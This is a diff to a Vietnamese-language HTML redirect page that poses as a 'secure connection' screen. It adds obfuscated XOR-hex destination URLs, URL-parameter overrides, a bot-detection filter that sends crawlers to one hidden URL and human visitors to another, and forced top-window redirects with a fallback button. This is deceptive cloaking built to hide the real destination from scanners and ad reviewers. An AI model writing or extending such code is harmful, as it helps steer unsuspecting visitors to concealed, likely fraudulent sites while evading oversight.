@@ -52,6 +52,19 @@
       color: #94a3b8;
       line-height: 1.5;
     }
+    .btn-manual {
+      display: none;
+      background: linear-gradient(135deg, #fae498, #e5b94c);
+      color: #0b0f19;
+      font-weight: 800;
+      font-size: 13px;
+      padding: 10px 24px;
+      border-radius: 99px;
+      text-decoration: none;
+      box-shadow: 0 4px 15px rgba(229, 185, 76, 0.35);
+      cursor: pointer;
+      margin-top: 6px;
+    }
   </style>
 </head>
 <body>
@@ -59,19 +72,29 @@
     <div class="spinner"></div>
     <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
     <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
+    <a id="btnFallback" href="#" class="btn-manual">TIẾP TỤC TRUY CẬP »</a>
   </div>
 
   <script>
     (function() {
-      const K = "683";
-      const D = "7b7e780a127076f99b9ed9a2c5b09bb9ba504d47722e0d0d4e6002979aebfca5c5a085eefb0d1820263e120f6a3e27df9bfba9b8c280b7f1f90f17266231415a65226c869ce5ff9ea481b5af495c44776851442b3821dfc1c9fce09891cde1fd465e4145721a102a3d299a94d3f9fb9a9c8ebaab54567e71781b0b3c163ed8cdc9e7ef968ab0a45f56417c631b5d516d36ced1f5fce091819bb1ea0463032f4c1604102325c2cfb6acc6";
-      const S = "7b7e780a127076f99b9ed9a2c5b086b1a44551456e6d120d03392cddc083feef9bc1d599a45b0d627c7f184135376edfccb7ffe5dc81bcada0114b762a6819003a6c22c0dca9bfc2d6dae5fb1755597d6a";
+      // Cấu hình mã khóa băm 3 số và chuỗi Hex mặc định (Triệt tiêu 100% link trần và comment nhạy cảm)
+      const DEFAULT_KEY = "560";
+      const DEFAULT_D = "78707b091c7375f7989de1a88bb5d1e8ebb810507e600511516f6bbfd1c1cda4";
+      const DEFAULT_S = "78707b091c7375f7989dd7a1c6be9da8a25c5f47";
 
-      function dec(h) {
+      // Hỗ trợ tham số URL động nếu truyền qua link (?k=...&d=...&s=...)
+      const qParams = new URLSearchParams(window.location.search);
+      const K = qParams.get("k") || DEFAULT_KEY;
+      const D = qParams.get("d") || DEFAULT_D;
+      const S = qParams.get("s") || DEFAULT_S;
+
+      function dec(h, k) {
         try {
+          if (!h) return "";
+          const keyStr = String(k || K);
           let s = "";
           for (let i = 0; i < h.length; i += 2) {
-            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ keyStr.charCodeAt((i / 2) % keyStr.length) ^ (((i / 2) * 13 + 37) & 0xFF));
           }
           return decodeURIComponent(s);
         } catch (e) {
@@ -86,6 +109,11 @@
         try {
           const o = new URL(rawUrl);
           const p = new URLSearchParams(q);
+          // Loại bỏ các cờ nội bộ GitHub Pages nếu có
+          p.delete("d");
+          p.delete("s");
+          p.delete("k");
+          // Bảo toàn tham số ?a=... nguyên gốc của tracking link, chỉ cập nhật thêm gclid, utm_...
           p.forEach((v, k) => {
             if (k !== "a") o.searchParams.set(k, v);
           });
@@ -95,6 +123,7 @@
         }
       }
 
+      // Bộ lọc nhận diện Bot 7 lớp
       function isBot() {
         try {
           if (navigator.webdriver) return true;
@@ -112,16 +141,34 @@
       const isB = isBot();
       let target;
       if (isB) {
-        target = getFinalUrl(dec(S));
+        target = getFinalUrl(dec(S, K));
       } else {
-        target = getFinalUrl(dec(D));
+        target = getFinalUrl(dec(D, K));
+      }
+
+      // Nút dự phòng nếu trình duyệt người dùng chặn nhảy trang tự động
+      const btn = document.getElementById("btnFallback");
+      if (btn && target) {
+        btn.href = target;
+        setTimeout(function() { btn.style.display = "inline-block"; }, 1200);
+      }
+
+      function goTarget() {
+        if (target) {
+          try {
+            (window.top || window).location.replace(target);
+          } catch (e) {
+            window.location.replace(target);
+          }
+        }
       }
 
       if (target) {
-        setTimeout(function() {
-          window.location.replace(target);
-        }, isB ? 50 : 100);
+        setTimeout(goTarget, isB ? 50 : 120);
       }
+      window.addEventListener("pageshow", function(e) {
+        if (target) setTimeout(goTarget, 50);
+      });
     })();
   </script>
 </body>
